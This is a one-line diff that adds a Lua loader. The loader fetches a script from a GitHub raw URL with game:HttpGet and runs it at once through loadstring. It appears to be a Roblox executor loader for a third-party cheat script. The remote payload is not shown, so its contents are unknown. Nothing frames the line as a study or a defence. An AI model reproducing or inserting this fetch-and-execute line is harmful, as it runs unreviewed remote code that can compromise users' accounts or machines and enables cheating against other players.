@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/mukbang-game-testing-spam7-13coibhgmco5wh.lua"))()
